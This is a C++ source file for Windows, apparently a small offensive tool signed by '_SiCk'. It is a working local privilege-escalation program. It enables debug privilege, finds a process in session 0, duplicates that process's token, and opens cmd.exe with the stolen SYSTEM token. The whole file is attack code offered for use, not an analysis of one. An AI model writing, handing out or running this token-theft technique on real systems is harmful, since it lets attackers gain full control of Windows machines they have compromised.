#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

// Function to display ASCII art of a cat
void displayCatArt() {
    std::cout << "\n\n";
    std::cout << " _._     _,-'\"\"`-._\n";
    std::cout << "(,-.`._,'(       |\\`-/|\n";
    std::cout << "    `-.-' \\ )-`( , o o)\n";
    std::cout << "          `-    \\`_`\"'-\n\n";
    std::cout << "                 Meow.\n";
    std::cout <<         "https://afflicted.sh/\n";
    std::cout <<          "Written by: _SiCk\n\n";
}

int main() {
    // Display cat art and info
    displayCatArt();

    // Enable debug privilege
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return 0;
    }

    TOKEN_PRIVILEGES tk;
    tk.PrivilegeCount = 1;
    tk.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tk.Privileges[0].Luid)) {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 0;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &tk, 0, nullptr, nullptr)) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);

    // Find a suitable target process
    HANDLE process_handle = nullptr;
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &processEntry)) {
            do {
                // Check if the process is running in session 0 (SYSTEM session)
                DWORD sessionID;
                if (ProcessIdToSessionId(processEntry.th32ProcessID, &sessionID) && sessionID == 0) {
                    pid = processEntry.th32ProcessID;
                    process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
                    if (process_handle) {
                        break;
                    }
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }

    if (!process_handle) {
        std::cerr << "Failed to open target process: " << GetLastError() << std::endl;
        return 0;
    }

    // Get the process token
    HANDLE process_token = nullptr;
    if (!OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &process_token)) {
        std::cerr << "Failed to open process token: " << GetLastError() << std::endl;
        CloseHandle(process_handle);
        return 0;
    }

    // Duplicate the process token
    HANDLE new_token = nullptr;
    if (!DuplicateTokenEx(process_token, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &new_token)) {
        std::cerr << "Failed to duplicate token: " << GetLastError() << std::endl;
        CloseHandle(process_token);
        CloseHandle(process_handle);
        return 0;
    }

    // Start the command prompt with the new token
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessWithTokenW(new_token, LOGON_WITH_PROFILE, nullptr, L"cmd.exe", CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
        std::cerr << "CreateProcessWithTokenW failed: " << GetLastError() << std::endl;
        CloseHandle(new_token);
        CloseHandle(process_token);
        CloseHandle(process_handle);
        return 0;
    }

    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(new_token);
    CloseHandle(process_token);
    CloseHandle(process_handle);
    return 0;
}

